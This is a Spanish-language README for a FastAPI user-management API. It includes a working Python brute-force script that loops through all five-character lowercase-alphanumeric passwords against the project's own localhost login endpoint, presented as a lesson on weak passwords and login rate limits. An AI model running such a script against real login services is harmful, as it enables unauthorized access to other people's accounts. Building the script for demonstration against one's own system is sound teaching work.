# CRUD-de-Usuarios-Prueba-controlada-de-fuerza-bruta-contra-tu-propia-API

Este proyecto permite gestionar usuarios (crear, ver, actualizar y eliminar) y también incluye una prueba controlada de contraseñas para entender cómo funcionan los ataques de fuerza bruta.

##Funcionalidades
- Crear usuarios → `POST /users`
- Ver todos los usuarios → `GET /users`
- Ver un usuario por ID → `GET /users/{id}`
- Actualizar usuario → `PUT /users/{id}`
- Eliminar usuario → `DELETE /users/{id}`
- Iniciar sesión → `POST /login`

##Ejecuccion
Ejecutar el programa:
  uvicorn main:app --reload
Abrir en el navegador:
  http://127.0.0.1:8000/docs
Ahí se podra probar todas las funcionalidades con un entorno gráfico.

##Prueba de fuerza bruta
Se incluyo un script en Python que intenta adivinar la contraseña de un usuario en especifico probando varias opciones automáticamente.
Ejemplo de uso:
      import requests
  
  url = "http://127.0.0.1:8000/login"
  username = "Mateo"
  chars = "abcdefghijklmnopqrstuvwxyz0123456789"
  encontrado = False
  
  for c1 in chars:
      for c2 in chars:
          for c3 in chars:
              for c4 in chars:
                  for c5 in chars:
                      password = c1 + c2 + c3 + c4 + c5
                      print("Probando:", password)
                      r = requests.post(
                          url,
                          data={
                              "username": username,
                              "password": password
                          }
                      )
                      if "Login exitoso" in r.text:
                          print("\n CONTRASEÑA ENCONTRADA:", password)
                          encontrado = True
                          break
                  if encontrado: break
              if encontrado: break
          if encontrado: break
      if encontrado: break
Este script sirve para ver cómo las contraseñas simples pueden ser vulnerables y por qué es importante usar contraseñas seguras.

##Enseñanza
°Cómo funcionan las operaciones básicas de usuarios
°Que contraseñas simples pueden ser descubiertas fácilmente
°La importancia de limitar intentos de login
°La necesidad de usar contraseñas seguras

##Dependencia
Requirements.txt: 
fastapi[standard], sqlmodel[standard]

Este proyecto demuestra cómo un sistema sin medidas de seguridad puede ser vulnerable a intentos automatizados de acceso.
También permite entender la importancia de proteger los sistemas mediante buenas prácticas como contraseñas seguras y control de intentos de inicio de sesión.
